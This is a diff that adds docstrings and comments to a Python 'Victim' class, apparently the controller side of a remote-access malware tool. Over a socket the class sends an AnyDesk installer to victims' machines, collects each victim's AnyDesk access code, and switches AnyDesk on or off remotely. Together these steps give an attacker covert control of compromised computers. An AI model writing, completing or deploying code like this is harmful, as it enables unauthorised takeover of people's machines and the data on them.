@@ -7,13 +7,32 @@ class Victim:
     code = None
 
     def __init__(self, socket, code=None):
+        """
+        param 1: the socket of the victim
+        param 2: the anydesk code of the victim
+
+        param 1 type: socket.socket
+        param 2 type: str
+        """
+
         self.socket = socket
         self.code = code
 
     def getAddr(self):
+        """
+        Returns the socket address (IP, PORT) of the victim
+       
+        return type: tuple
+        """
+       
         return self.socket.getsockname()
 
     def initialize(self):
+        """
+        Initalizes the victim:
+        Install anydesk and get the code
+        """
+       
         self._sendCommand(INSTALL_ANYDESK_COMMAND)
         self._installAnydesk()
 
@@ -30,9 +49,15 @@ class Victim:
             self.code = code
 
     def _installAnydesk(self):
+        """
+        Installs anydesk on the victim pc
+        """
+
         print(
             f"{self.getAddr()}: Sending the anydesk file to the victim...")
 
+
+        # Sends the anydesk file
         fileSize = os.path.getsize(ANYDESK_FILE_PATH)
         self.socket.send(fileSize.to_bytes(4, "big"))
 
@@ -49,6 +74,12 @@ class Victim:
             f"{self.getAddr()}: The anydesk file has been sent to the victim !")
 
     def getCode(self):
+        """
+        Returns the anydesk code of the victim
+
+        return type: str
+        """
+
         print(f"{self.getAddr()}: Getting the code from the victim...")
         self._sendCommand(GET_CODE_COMMAND)
 
@@ -62,18 +93,32 @@ class Victim:
         return code
 
     def powerOnAnydesk(self):
+        """
+        Powers on anydesk on the victim's pc
+        """
+
         print(f"{self.getAddr()}: Powering on anydesk on the victim's pc")
         self._sendCommand(POWER_ON_ANYDESK_COMMAND)
         print(
             f"{self.getAddr()}: Anydesk will be powered on Immediately on the victim's pc")
 
     def powerOffAnydesk(self):
+        """
+        Powers off (kill) anydesk on the victim's pc
+        """
+        
         print(f"{self.getAddr()}: Powering off anydesk on the victim's pc")
         self._sendCommand(POWER_OFF_ANYDESK_COMMAND)
         print(
             f"{self.getAddr()}: Anydesk will be powered off Immediately on the victim's pc")
 
     def _sendCommand(self, command):
+        """
+        Sends the command to the victim
+        
+        param 1: the command to executes
+        param 1 type: str
+        """
 
         code = None
 
